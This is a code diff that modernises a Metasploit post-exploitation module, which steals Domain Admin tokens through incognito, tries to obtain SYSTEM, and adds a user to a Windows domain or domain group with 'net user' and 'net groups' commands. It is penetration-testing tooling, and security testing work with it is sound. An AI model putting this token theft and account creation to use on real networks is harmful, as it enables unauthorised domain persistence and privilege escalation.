@@ -1,13 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
-
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Priv
 
   def initialize(info={})
@@ -16,7 +12,7 @@ class Metasploit3 < Msf::Post
         'Description'   => %q{
               This module adds a user to the Domain and/or to a Domain group. It will
             check if sufficient privileges are present for certain actions and run
-            getprivs for system.  If you elevated privs to system,the
+            getprivs for system.  If you elevated privs to system, the
             SeAssignPrimaryTokenPrivilege will not be assigned. You need to migrate to
             a process that is running as system. If you don't have privs, this script
             exits.
@@ -35,7 +31,7 @@ class Metasploit3 < Msf::Post
         OptBool.new('ADDTODOMAIN', [true,  'Add user to the Domain', true]),
         OptString.new('TOKEN',     [false, 'Username or PID of the Token which will be used. If blank, Domain Admin Tokens will be enumerated. (Username doesnt require a Domain)', '']),
         OptBool.new('GETSYSTEM',   [true,  'Attempt to get SYSTEM privilege on the target host.', true])
-      ], self.class)
+      ])
   end
 
   def get_system
@@ -76,7 +72,7 @@ class Metasploit3 < Msf::Post
     end
 
     if(! session.incognito)
-      print_status("!! Failed to load incognito on #{session.sid} / #{session.session_host}")
+      print_error("Failed to load incognito on #{session.sid} / #{session.session_host}")
       return false
     end
 
@@ -157,7 +153,7 @@ class Metasploit3 < Msf::Post
     end
 
     if(! session.incognito)
-      print_error("!! Failed to load incognito on #{session.sid} / #{session.session_host}")
+      print_error("Failed to load incognito on #{session.sid} / #{session.session_host}")
       return false
     end
 
@@ -223,12 +219,11 @@ class Metasploit3 < Msf::Post
     end
 
     ## steal token if neccessary
-    if (datastore['TOKEN'] == '')
-      token_found,token_user,current_user = token_hunter(domain)
-
-      return if token_found == false
-
-      datastore['TOKEN'] = token_user if current_user == false
+    if datastore['TOKEN'] == ''
+      token_found, token_user, current_user = token_hunter(domain)
+      if token_found && current_user == false
+        datastore['TOKEN'] = token_user
+      end
     end
 
     ## steal token
@@ -247,7 +242,7 @@ class Metasploit3 < Msf::Post
     already_member_group = false
 
     ## Add user to the domain
-    if (datastore['ADDTODOMAIN'] == true)
+    if datastore['ADDTODOMAIN']
       user_add_res = run_cmd("net user \"#{datastore['USERNAME']}\" /domain",false)
 
       if (user_add_res =~ /The command completed successfully/ and user_add_res =~ /Domain Users/)
@@ -261,7 +256,7 @@ class Metasploit3 < Msf::Post
     end
 
     ## Add user to a domain group
-    if datastore['ADDTOGROUP'] == true
+    if datastore['ADDTOGROUP']
       ## check if user is already a member of the group
       group_add_res = run_cmd("net groups \"#{datastore['GROUP']}\" /domain",false)
 
@@ -291,7 +286,7 @@ class Metasploit3 < Msf::Post
     end
 
     ## verify user was added to domain or domain group
-    if datastore['ADDTOGROUP'] == true
+    if datastore['ADDTOGROUP']
       if already_member_group == false
         net_groups_res = run_cmd("net groups \"#{datastore['GROUP']}\" /domain",false)
 
